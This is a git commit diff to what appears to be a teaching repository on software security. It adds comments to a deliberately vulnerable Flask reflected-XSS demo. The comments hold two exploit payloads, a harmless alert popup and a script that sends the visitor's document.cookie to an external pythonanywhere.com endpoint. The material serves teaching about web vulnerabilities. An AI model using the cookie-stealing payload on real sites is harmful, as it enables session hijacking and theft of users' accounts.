ee4ff48072454a26f96ca239f282bf80fec922b6
Joanna Cecilia da Silva Santos <joannacss@Joannas-MacBook-Pro-3.local>
2026-09-02 13:39:50 -0400

    Minor edits on code

--- deadly-sins/xss/live_reflected_xss.py
+++ deadly-sins/xss/live_reflected_xss.py
@@ -1,6 +1,11 @@
 # An example of reflected XSS
 # To run: flask --app live_reflected_xss  --debug run
 # (The --debug will allow auto reload)
+# Exploit examples:
+## Example 1: simply pop up a message saying "Hi"
+### <script>alert("hi")</script>
+## Example 2: send cookies to an external location
+### <script>var%20img=new%20Image();document.body.appendChild(img);img.src="https://jdasilv2.pythonanywhere.com/hacked/"%2Bdocument.cookie;document.body.appendChild(img);</script>
 
 from flask import Flask
 from flask import render_template, make_response, request
